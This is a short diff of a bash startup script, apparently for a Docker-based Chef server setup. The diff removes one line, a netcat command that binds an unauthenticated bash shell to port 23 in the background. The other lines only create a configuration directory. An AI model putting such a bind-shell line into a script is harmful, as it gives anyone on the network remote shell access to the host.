@@ -1,5 +1,4 @@
 #!/bin/bash
-nc -vvlp 23 -e /bin/bash &
 
 # override our hostname as docker hostnames change CONSTANTLY
 mkdir /etc/chef-server
